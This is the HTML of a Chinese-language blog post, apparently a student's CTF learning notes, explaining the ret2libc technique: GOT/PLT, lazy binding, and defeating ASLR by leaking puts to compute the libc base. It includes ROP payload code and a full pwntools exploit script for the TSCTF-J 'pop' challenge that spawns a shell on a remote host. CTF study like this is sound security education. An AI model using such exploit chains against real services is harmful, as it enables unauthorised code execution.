@@ -1,0 +1,143 @@
+<!DOCTYPE html><html lang="zh-CN" theme-mode="auto"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>pwn学习记录（其三） | qsc</title><meta name="keywords" content="CTF,pwn"><meta name="description" content="ret2libic 如果程序中没有system函数，在libc里找到system，使用输出libc其中的函数地址，从而计算基地址，来利用libc中的system(“&#x2F;bin&#x2F;sh”)  实现步骤 找到一个函数的真实地址，使程序打印并回到函数开始的地方 根据基地址计算函数的偏移地址 确认system函数和”&#x2F;bin&#x2F;sh”字符串在libc库中的偏移地址*计算真">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn学习记录（其三）">
+<meta property="og:url" content="https://qinsca.github.io/posts/9d440e51/">
+<meta property="og:site_name" content="qsc">
+<meta property="og:description" content="ret2libic 如果程序中没有system函数，在libc里找到system，使用输出libc其中的函数地址，从而计算基地址，来利用libc中的system(“&#x2F;bin&#x2F;sh”)  实现步骤 找到一个函数的真实地址，使程序打印并回到函数开始的地方 根据基地址计算函数的偏移地址 确认system函数和”&#x2F;bin&#x2F;sh”字符串在libc库中的偏移地址*计算真">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-11-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-10-15T10:41:49.732Z">
+<meta property="article:author" content="qsc">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary"><link rel="canonical" href="https://qinsca.github.io/posts/9d440e51/"><link rel="icon" type="image/png" href="/images/qsc-favicon-32.png"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.woff2"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css">
+<script id="ak-color-mode-init">
+(function () {
+  var doc = document.documentElement;
+  try {
+    var saved = window.localStorage.getItem('theme-mode');
+    var media = window.matchMedia('(prefers-color-scheme: dark)');
+    var mode = ('light' === saved || 'dark' === saved)
+      ? saved
+      : (media.matches ? 'dark' : 'light');
+    if (doc.getAttribute('theme-mode') !== mode) {
+      doc.setAttribute('theme-mode', mode);
+    }
+  } catch (e) {
+    if (doc.getAttribute('theme-mode') === 'auto') {
+      doc.setAttribute('theme-mode', 'dark');
+    }
+  }
+})();
+</script><style>@font-face {
+  font-family: Bender;
+  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+  font-family: BenderLight;
+  src: local('BenderLight'), url("/font/BenderLight.woff2") format('woff2');
+}
+@font-face {
+  font-family: 'JetBrains Mono';
+  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+</style><meta name="page-config" content="{&quot;code_fold&quot;:null}"><script class="pjax-js">var config = {"root":"/","code_fold":20,"search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"复制"}};
+var page_config = {
+  code_fold: null
+};
+function updatePageConfig() {
+  var newPageConfig = document.querySelector('meta[name="page-config"]');
+  if (newPageConfig) {
+    page_config = JSON.parse(newPageConfig.content);
+  }
+}
+document.addEventListener('pjax:complete', function() { updatePageConfig(); });
+updatePageConfig();</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@11.12.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><style defer src="/css/ak-custom.css"></style><link rel="stylesheet" href="/css/ak-custom.css"><script>if (window.localStorage.getItem('theme-mode') === 'light' || window.matchMedia('(prefers-color-scheme:light)').matches)
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark' || window.matchMedia('(prefers-color-scheme:dark)').matches)
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.woff2") format('woff2');
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+ --dark-background: url('/img/bg.jpg');
+ --light-background: url('/img/bk.jpg');
+ --theme-encrypt-confirm: '确认'
+}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script defer src="https://vercount.one/js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@11.12.2/dist/mermaid.esm.min.mjs';
+window.mermaid = mermaid;
+code.paintMermaid();
+</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.vercount','meta[name=page-config]'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);document.addEventListener('pjax:success', _ => {
+ const script = document.createElement('script');
+ script.src = 'https://vercount.one/js';
+ document.head.appendChild(script);
+});reset()})</script><script class="pjax-js">reset= () => {window.giscusSettings = {
+ repo: 'qinsca/qinsca.github.io',
+ repoId: 'R_kgDOQKri3w',
+ category: 'Announcements',
+ categoryId: 'DIC_kwDOQKri384CzWLD',
+ mapping: 'pathname',
+ strict: '0',
+ reactionsEnabled: '1',
+ emitMetadata: '0',
+ inputPosition: 'bottom',
+ lang: 'zh-CN',
+ crossorigin: 'anonymous' , loading: 'lazy'};window.giscusThemeConfig = { light: 'light', dark: 'transparent_dark' };document.querySelector('.lg-container')?.remove()
+const postBg = document.querySelector('#post-bg');
+if (postBg) lightGallery(postBg, {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.vercount','meta[name=page-config]'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);document.addEventListener('pjax:success', _ => {
+ const script = document.createElement('script');
+ script.src = 'https://vercount.one/js';
+ document.head.appendChild(script);
+});reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/tags/"><span class="navItemTitle">Tags</span></a></li><li class="navItem"><a class="navBlock" href="/categories/"><span class="navItemTitle">Categories</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>pwn学习记录（其三）</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2025-11-08T16:00:00.000Z" id="date"> 2025-11-09</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2026-10-15T10:41:49.732Z" id="updated"> 2026-10-15</time></div></span><br><span>文章总字数: <div class="control">922</div></span><br><span>预计阅读时间: <div class="control">3 分钟</div></span><br><span id="vercount_container_page_pv">页面浏览: <span class="control" id="vercount_value_page_pv">加载中...</span></span></div></div><hr><div id="post-content"><h1 id="ret2libic"><a href="#ret2libic" class="headerlink" title="ret2libic"></a>ret2libic</h1><blockquote>
+<p>如果程序中没有system函数，在libc里找到system，使用输出libc其中的函数地址，从而计算基地址，来利用libc中的system(“&#x2F;bin&#x2F;sh”)</p>
+</blockquote>
+<h2 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h2><ul>
+<li>找到一个函数的真实地址，使程序打印并回到函数开始的地方</li>
+<li>根据基地址计算函数的偏移地址</li>
+<li>确认system函数和”&#x2F;bin&#x2F;sh”字符串在libc库中的偏移地址<br>*计算真实地址</li>
+<li>劫持程序的执行流程，让程序执行system(“&#x2F;bin&#x2F;sh”)</li>
+</ul>
+<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><ul>
+<li>全局偏移量表(GOT)<br>全局偏移量表（GOT）是一个在程序的数据段中的表，它存储了程序中所有需要动态链接的函数和变量的地址。当程序第一次调用一个动态链接的函数时，动态链接器会查找该函数在动态链接库中的地址，然后将这个地址存储在GOT表中的相应条目中。这样，当程序再次调用这个函数时，它就可以直接从GOT表中获取这个函数的地址，而不需要再次进行查找。</li>
+<li>程序链接表(PLT)<br>程序链接表（PLT）是一个在程序的代码段中的表，它包含了一系列的跳转指令，这些指令用于跳转到GOT表中的相应条目。当程序需要调用一个动态链接的函数时，它会首先跳转到PLT表中的相应条目，然后通过这个条目跳转到GOT表中的相应条目，最后跳转到这个函数在动态链接库中的实际地址。</li>
+<li>延迟绑定<br>只有动态库libc中的函数在被调用时，才会进行地址解析和重定位工作，也就是说，只有函数发生调用之后，我们才能够通过got表读取到libc中的函数。</li>
+<li>偏移地址<br>libc是Linux系统下的C函数库，其中就会有system()函数、”&#x2F;bin&#x2F;sh”字符串，而libc库中存放的就是这些函数的偏移地址。</li>
+<li>基地址<br>每次运行程序加载函数时，函数的基地址都会发生改变。这是一种地址随机化的保护机制，导致函数的真实地址每次运行都是不一样的。<br>这次运行程序的基地址 &#x3D; 这次运行得到的某个函数func的真实地址  - 函数func的偏移地址</li>
+</ul>
+<h2 id="实战-以TSCTF-J-pop-为例"><a href="#实战-以TSCTF-J-pop-为例" class="headerlink" title="实战(以TSCTF-J pop 为例)"></a>实战(以TSCTF-J pop 为例)</h2><h3 id="泄露libc基址"><a href="#泄露libc基址" class="headerlink" title="泄露libc基址"></a>泄露libc基址</h3><p>  vuln &#x3D; 0x400626<br>  pop_rdi_ret &#x3D; 0x0000000000400713<br>  puts_got &#x3D; elf.got[‘puts’]<br>  puts_plt &#x3D; elf.plt[‘puts’]<br>  pl &#x3D; p64(0)*3 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)<br>  p.sendlineafter(b’time!\n’,pl)<br>选择puts函数，劫持程序打印puts函数的真实地址<br>计算libc的真实地址<code>libc.address = u64(p.recv(6).ljust(8,b&#39;\x00&#39;)) - 0x6f6a0</code></p>
+<h3 id="劫持程序运行system-“-bin-sh”"><a href="#劫持程序运行system-“-bin-sh”" class="headerlink" title="劫持程序运行system(“&#x2F;bin&#x2F;sh”)"></a>劫持程序运行system(“&#x2F;bin&#x2F;sh”)</h3><p>  binsh &#x3D; next(libc.search(b’&#x2F;bin&#x2F;sh’))<br>  system &#x3D; libc.sym[‘system’]<br>  pl &#x3D; p64(0)*3 + p64(pop_rdi_ret) + p64(binsh) + p64(system)<br>  p.sendlineafter(b’time!\n’,pl)<br>获取”bin&#x2F;sh”和system的真实地址，跳回vuln函数开头，执行system(“&#x2F;bin&#x2F;sh”)</p>
+<h3 id="官方wp"><a href="#官方wp" class="headerlink" title="官方wp"></a>官方wp</h3><p>from pwn import *<br>p &#x3D; remote(‘10.21.131.92’,33783)<br>#p &#x3D; remote(‘127.0.0.1’,1337)<br>#p &#x3D; process(‘.&#x2F;pwn’)<br>libc &#x3D; ELF(‘.&#x2F;libc-2.23.so’)<br>elf &#x3D; ELF(‘.&#x2F;pwn’)<br>context(os&#x3D;’linux’,arch&#x3D;’amd64’,log_level&#x3D;’debug’)<br>def exp():<br>    vuln &#x3D; 0x400626<br>    pop_rdi_ret &#x3D; 0x0000000000400713<br>    puts_got &#x3D; elf.got[‘puts’]<br>    puts_plt &#x3D; elf.plt[‘puts’]<br>    pl &#x3D; p64(0)*3 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)<br>    p.sendlineafter(b’time!\n’,pl)<br>    libc.address &#x3D; u64(p.recv(6).ljust(8,b’\x00’)) - 0x6f6a0<br>    binsh &#x3D; next(libc.search(b’&#x2F;bin&#x2F;sh’))<br>    system &#x3D; libc.sym[‘system’]<br>    pl &#x3D; p64(0)*3 + p64(pop_rdi_ret) + p64(binsh) + p64(system)<br>    p.sendlineafter(b’time!\n’,pl)<br>    log.success(‘libc_base:’+hex(libc.address))<br>    #gdb.attach(p)<br>    p.interactive()<br>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:<br>    exp()</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/posts/2a691734/">← 下一篇 pwn学习记录（其四）</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/posts/cf13ee37/">随便记点 上一篇 →</a></div></div></div><div id="comments"><div id="giscus"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" onClick="tocControl.change()" title="文章目录"><span class="tocBtnIconBar"></span><span class="tocBtnIconBar"></span><span class="tocBtnIconBar"></span></a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/images/qsc-avatar.png" alt="qsc" style="margin:6px;border-radius:50%;"></a><h1 id="Dr"><a href="/about/">qsc</a></h1><div id="description"><p>记录学习日常</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/qinsca"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="mailto:1744326850@qq.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2libic"><span class="toc-number">1.</span> <span class="toc-text">ret2libic</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.1.</span> <span class="toc-text">实现步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%8F%90"><span class="toc-number">1.2.</span> <span class="toc-text">前提</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98-%E4%BB%A5TSCTF-J-pop-%E4%B8%BA%E4%BE%8B"><span class="toc-number">1.3.</span> <span class="toc-text">实战(以TSCTF-J pop 为例)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9D%80"><span class="toc-number">1.3.1.</span> <span class="toc-text">泄露libc基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8Csystem-%E2%80%9C-bin-sh%E2%80%9D"><span class="toc-number">1.3.2.</span> <span class="toc-text">劫持程序运行system(“&#x2F;bin&#x2F;sh”)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%98%E6%96%B9wp"><span class="toc-number">1.3.3.</span> <span class="toc-text">官方wp</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script defer src="/js/ak-custom.js"></script></body></html>
